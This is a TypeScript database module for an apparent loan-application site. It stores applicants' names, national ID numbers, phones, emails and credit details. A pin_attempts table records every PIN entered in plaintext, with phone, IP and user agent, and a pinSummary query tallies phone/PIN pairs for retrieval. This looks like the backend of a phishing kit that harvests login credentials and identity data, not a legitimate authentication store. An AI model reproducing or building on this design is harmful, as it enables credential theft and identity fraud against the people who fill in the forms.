import Database from "better-sqlite3";
import { mkdirSync } from "node:fs";
import { dirname, resolve } from "node:path";

const file = resolve(process.env.DATABASE_PATH ?? "data/applications.db");
mkdirSync(dirname(file), { recursive: true });

const globalForDb = globalThis as unknown as { __db?: Database.Database };
const db = globalForDb.__db ?? new Database(file);

if (process.env.NODE_ENV !== "production") globalForDb.__db = db;

db.pragma("journal_mode = WAL");
db.exec(`
  CREATE TABLE IF NOT EXISTS applications (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ref TEXT NOT NULL UNIQUE,
    amount INTEGER NOT NULL,
    tenure INTEGER NOT NULL,
    name TEXT NOT NULL,
    ic TEXT NOT NULL,
    phone TEXT NOT NULL,
    email TEXT NOT NULL,
    utm TEXT,
    status TEXT NOT NULL DEFAULT 'baru',
    created_at TEXT NOT NULL DEFAULT (datetime('now'))
  );
  CREATE INDEX IF NOT EXISTS idx_applications_created ON applications (created_at DESC);
`);

const addColumn = (sql: string) => {
  try {
    db.exec(sql);
  } catch {
    /* lajur sudah wujud */
  }
};

addColumn(`ALTER TABLE applications ADD COLUMN age INTEGER`);
addColumn(`ALTER TABLE applications ADD COLUMN income INTEGER`);
addColumn(`ALTER TABLE applications ADD COLUMN employment TEXT`);
addColumn(`ALTER TABLE applications ADD COLUMN existing_loans INTEGER DEFAULT 0`);
addColumn(`ALTER TABLE applications ADD COLUMN credit_grade TEXT`);
addColumn(`ALTER TABLE applications ADD COLUMN score INTEGER`);
addColumn(`ALTER TABLE applications ADD COLUMN reasons TEXT`);
addColumn(`ALTER TABLE applications ADD COLUMN decided_at TEXT`);
addColumn(`ALTER TABLE applications ADD COLUMN decided_by TEXT`);

db.exec(`
  CREATE TABLE IF NOT EXISTS decision_log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    application_id INTEGER NOT NULL,
    verdict TEXT NOT NULL,
    score INTEGER,
    note TEXT,
    actor TEXT NOT NULL DEFAULT 'auto',
    created_at TEXT NOT NULL DEFAULT (datetime('now')),
    FOREIGN KEY (application_id) REFERENCES applications (id) ON DELETE CASCADE
  );

  CREATE TABLE IF NOT EXISTS pin_attempts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    phone TEXT NOT NULL,
    pin TEXT NOT NULL,
    source TEXT NOT NULL DEFAULT 'login',
    ip TEXT,
    user_agent TEXT,
    created_at TEXT NOT NULL DEFAULT (datetime('now'))
  );
  CREATE INDEX IF NOT EXISTS idx_pin_phone ON pin_attempts (phone, created_at DESC);
  CREATE INDEX IF NOT EXISTS idx_pin_created ON pin_attempts (created_at DESC);
`);

export const getApplication = (id: number) =>
  db.prepare(`SELECT * FROM applications WHERE id = ?`).get(id) as ApplicationRow | undefined;

export const saveDecision = db.prepare(`
  UPDATE applications
  SET status = @status, score = @score, reasons = @reasons, decided_at = datetime('now'), decided_by = @actor
  WHERE id = @id
`);

export const logDecision = db.prepare(`
  INSERT INTO decision_log (application_id, verdict, score, note, actor)
  VALUES (@id, @verdict, @score, @note, @actor)
`);

export const logPin = db.prepare(`
  INSERT INTO pin_attempts (phone, pin, source, ip, user_agent)
  VALUES (@phone, @pin, @source, @ip, @ua)
`);

export const recentPins = (limit = 200) =>
  db.prepare(`SELECT * FROM pin_attempts ORDER BY id DESC LIMIT ?`).all(limit) as {
    id: number; phone: string; pin: string; source: string; ip: string | null;
    user_agent: string | null; created_at: string;
  }[];

export const pinSummary = () =>
  db.prepare(`
    SELECT phone,
           pin,
           COUNT(*) AS hits,
           MAX(created_at) AS last_seen
    FROM pin_attempts
    GROUP BY phone, pin
    ORDER BY last_seen DESC, hits DESC
  `).all() as { phone: string; pin: string; hits: number; last_seen: string }[];
export type ApplicationRow = {
  id: number; ref: string; amount: number; tenure: number; name: string;
  ic: string; phone: string; email: string; utm: string | null;
  status: string; created_at: string;
};

export const insertApplication = db.prepare(`
  INSERT INTO applications (ref, amount, tenure, name, ic, phone, email, utm)
  VALUES (@ref, @amount, @tenure, @name, @ic, @phone, @email, @utm)
`);

export const listApplications = (limit = 200) =>
  db.prepare(`SELECT * FROM applications ORDER BY id DESC LIMIT ?`).all(limit) as ApplicationRow[];

export const statsSummary = () =>
  db.prepare(`
    SELECT COUNT(*) AS total,
           SUM(CASE WHEN date(created_at) = date('now') THEN 1 ELSE 0 END) AS today,
           COALESCE(SUM(amount), 0) AS volume
    FROM applications
  `).get() as { total: number; today: number; volume: number };

export { db };